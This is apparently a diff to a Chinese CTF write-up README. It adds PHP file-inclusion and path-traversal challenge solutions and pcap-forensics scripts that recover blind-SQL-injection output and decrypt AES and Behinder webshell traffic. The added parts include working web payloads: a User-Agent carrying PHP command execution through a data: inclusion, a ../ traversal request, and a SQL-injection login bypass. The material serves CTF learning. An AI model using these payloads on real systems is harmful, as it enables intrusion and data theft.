@@ -84,7 +84,7 @@ text = requests.post(url,headers={
 print(text.text)
 ```
 ### PHP基础-004
-> 快速提交
+> 弱类型转换
 ### PHP基础-005
 > 编码 base32 -> base64
 ### PHP基础-006
@@ -140,8 +140,43 @@ print(resp.text)
 ```shell
 docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o msg1.bin msg2.bin
 ```
+### PHP基础-025
+> 基础的文件包含分析
+
+```http request
+GET /?page=data:,x/profile HTTP/1.1
+Host: ip:port
+User-Agent: <?php system('cat /flag');?>
+X-Forwarded-For: data:,x
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+```
+
+### PHP基础-026
+
+> 基础签到题
+
+```http
+GET /source.php?file=source.php?/../../../../ffffllllaaaagggg HTTP/1.1
+Host: ip:port
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+
+```
+
+
 
 ## SQL注入
+
 ### SQL注入-001
 > 万能密码 `?username=admin' or 1=1 --+&password=1`
 ### SQL注入-002
@@ -1088,6 +1123,142 @@ fcrackzip -b -l 5 -ca  -u ctf.zip
 
 ![img.png](./img/README/img-3160332.png)
 
+### 流量隐写-001
+
+> sql注入-流量隐写
+
+利用 `strings` 命令可直接提取HTTP请求中的内容
+
+![img.png](./img/README/img-3427877.png)
+
+
+或者利用python 直接可提取
+
+```python
+import re
+
+import pyshark
+from urllib.parse import unquote
+
+filter_expr = "http && http.request.full_uri"
+cap = pyshark.FileCapture('sqli.pcapng', display_filter=filter_expr)
+# 遍历数据包并打印摘要信息
+requests_uris = []
+
+for packet in cap:
+    request_uri = packet.http.request_uri
+    # url解码
+    request_uri = unquote(request_uri)
+    if 'ascii(substring' in request_uri:
+        requests_uris.append(request_uri)
+cap.close()
+nums = {}
+print(requests_uris)
+flag = ""
+for u in requests_uris:
+    f_ord = re.findall(r',1\)\)=(.*)', u)[0]
+    flag += chr(int(f_ord))
+print(flag)
+
+```
+
+```text
+flag{7a9acaf0-f8c8-d171-8b13-6f72ec91a21e}
+```
+
+### 流量隐写-002
+
+> sql注入-流量隐写
+
+利用 `strings` 命令可直接提取wireshark中的`strings`，发现疑似`rsa`加密
+
+![img.png](./img/README/img-3754530.png)
+
+使用wireshark查看后发现，果然为`aes`加密通讯
+
+![image-20240418175951419](./img/README/image-20240418175951419.png)
+
+可使用在线工具进行解密[AES](https://tool.lmeee.com/jiami/aes)
+
+![image-20240418180250253](./img/README/image-20240418180250253.png)
+
+![image-20240418180324936](./img/README/image-20240418180324936.png)
+
+![image-20240418180339928](./img/README/image-20240418180339928.png)
+
+也可使用`python`脚本
+
+```python
+import base64
+import json
+import re
+
+import pyshark
+from urllib.parse import unquote
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+
+# 加密函数
+def encrypt(key, message):
+    cipher = AES.new(key, AES.MODE_ECB)
+    padded_plaintext = pad(message, AES.block_size)
+    return base64.b64encode(cipher.encrypt(padded_plaintext)).decode("utf-8")
+
+
+def decrypt(key, encrypted_message):
+    cipher = AES.new(key, AES.MODE_ECB)
+    text = cipher.decrypt(base64.b64decode(encrypted_message))
+    return unpad(text, AES.block_size).decode("utf-8")
+filter_expr = "tcp"
+cap = pyshark.FileCapture('ctf.pcapng', display_filter=filter_expr)
+# 遍历数据包并打印摘要信息
+payloads = []
+for pkt in cap:
+    # 检查数据包是否为 TCP 协议
+    if 'TCP' in pkt:
+        # 访问 TCP 层信息
+        tcp_layer = pkt['TCP']
+        # 打印 TCP 载荷（数据）
+        if hasattr(tcp_layer, 'payload') and tcp_layer.payload is not None:
+            # 打印 TCP 载荷（数据）
+            payload = bytes.fromhex(tcp_layer.payload.replace(":", ""))
+            payloads.append(payload)
+
+info_key = json.loads(payloads[0])['key']
+print(info_key)
+for i in range(1,len(payloads)):
+    print(decrypt(info_key.encode("utf-8"),payloads[i].decode("utf-8")))
+    
+
+
+
+```
+
+
+
+### 流量隐写-003
+
+> 冰蝎 php流量加密
+
+通过流量包分析得到，是通过`upload.php`上传的恶意文件，并能看出来酷似冰蝎加密的一句话木马
+
+![image-20240422142820159](./img/README/image-20240422142820159-3768984.png)
+
+查看后续利用发现为加密的流量，简单编写编写解密的脚本
+
+![image-20240422145809175](./img/README/image-20240422145809175.png)
+
+解密出的代码是执行了代码的
+
+![image-20240422143851640](./img/README/image-20240422143851640.png)
+
+解密后续流量，得到执行命令后的结果
+
+![image-20240422144406798](./img/README/image-20240422144406798.png)
+
+![image-20240422145416365](./img/README/image-20240422145416365.png)
 
 
 
